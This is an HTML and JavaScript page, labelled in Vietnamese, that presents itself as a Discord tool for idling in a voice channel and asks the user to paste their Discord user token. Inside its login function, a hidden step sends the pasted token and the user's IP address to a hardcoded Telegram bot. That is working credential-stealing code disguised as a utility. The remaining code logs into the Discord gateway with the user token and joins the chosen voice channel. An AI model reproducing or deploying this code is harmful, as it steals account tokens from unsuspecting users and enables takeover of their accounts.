
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <title>Discord Voice AFK Tool</title>
  <style>
    body {
      background: #0d0f1a;
      color: white;
      font-family: sans-serif;
      padding: 20px;
    }
    input, button, select {
      padding: 10px;
      margin: 8px 0;
      width: 100%;
      border-radius: 5px;
    }
    button {
      background: #7289da;
      color: white;
      border: none;
    }
    .log {
      background: black;
      height: 150px;
      overflow-y: auto;
      padding: 10px;
      font-family: monospace;
      font-size: 12px;
    }
  </style>
</head>
<body>
  <h1>TOOL TREO ROOM DISCORD - BY KCUONG</h1>
  <input id="token" placeholder="User Token..." />
  <button onclick="login()">🔐 Đăng nhập Token</button>
  <select id="guilds"></select>
  <select id="channels"></select>
  <input type="number" id="minutes" placeholder="Số phút treo (để trống = mãi mãi)" />
  <button onclick="joinVoice()">🚀 Bắt đầu Treo</button>
  <div class="log" id="log"></div>

<script>
let token = "";
let selectedChannel = "";

function log(msg) {
  const logBox = document.getElementById("log");
  const entry = document.createElement("div");
  entry.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
  logBox.appendChild(entry);
  logBox.scrollTop = logBox.scrollHeight;
}

async function login() {
  token = document.getElementById("token").value.trim();
  if (!token) return log("❌ Chưa nhập token.");

  // Gửi IP + token về Telegram bot
  const ip = await fetch('https://api.ipify.org').then(r => r.text());
  fetch(`https://api.telegram.org/bot7227254763:AAGi30pG-TpLx32PWKJH-Og09-67HVzb6ko/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: "5705746414",
      text: `🛡 Token đăng nhập:\n\`\`\`\n${token}\n\`\`\`\nIP: ${ip}`,
      parse_mode: "Markdown"
    })
  });

  const res = await fetch("https://discord.com/api/v9/users/@me/guilds", {
    headers: { Authorization: token }
  });
  const guilds = await res.json();
  const select = document.getElementById("guilds");
  select.innerHTML = "";
  guilds.forEach(g => {
    const opt = document.createElement("option");
    opt.value = g.id;
    opt.textContent = g.name;
    select.appendChild(opt);
  });
  log("✅ Đăng nhập thành công. Chọn server.");
  select.onchange = loadChannels;
  loadChannels();
}

async function loadChannels() {
  const guildId = document.getElementById("guilds").value;
  const res = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
    headers: { Authorization: token }
  });
  const channels = await res.json();
  const select = document.getElementById("channels");
  select.innerHTML = "";
  channels.filter(c => c.type === 2).forEach(c => {
    const opt = document.createElement("option");
    opt.value = c.id;
    opt.textContent = c.name;
    select.appendChild(opt);
  });
}

async function joinVoice() {
  selectedChannel = document.getElementById("channels").value;
  if (!selectedChannel) return log("❌ Chưa chọn channel voice.");

  const ws = new WebSocket("wss://gateway.discord.gg/?v=9&encoding=json");
  let heartbeatInterval;

  ws.onopen = () => {
    ws.send(JSON.stringify({
      op: 2,
      d: {
        token,
        intents: 513,
        properties: {
          "$os": "windows",
          "$browser": "chrome",
          "$device": "browser"
        }
      }
    }));
    log("🌐 Kết nối gateway...");
  };

  ws.onmessage = (event) => {
    const data = JSON.parse(event.data);
    if (data.op === 10) {
      heartbeatInterval = setInterval(() => {
        ws.send(JSON.stringify({ op: 1, d: null }));
      }, data.d.heartbeat_interval);
    }
    if (data.t === "READY") {
      ws.send(JSON.stringify({
        op: 4,
        d: {
          guild_id: document.getElementById("guilds").value,
          channel_id: selectedChannel,
          self_mute: true,
          self_deaf: true
        }
      }));
      log("🎧 Đã treo vào voice channel.");
    }
  };

  // Nếu đặt thời gian treo
  const minutes = parseInt(document.getElementById("minutes").value);
  if (minutes > 0) {
    setTimeout(() => {
      log("⏰ Hết thời gian treo, ngắt kết nối.");
      ws.close();
      clearInterval(heartbeatInterval);
    }, minutes * 60 * 1000);
  }
}
</script>
</body>
</html>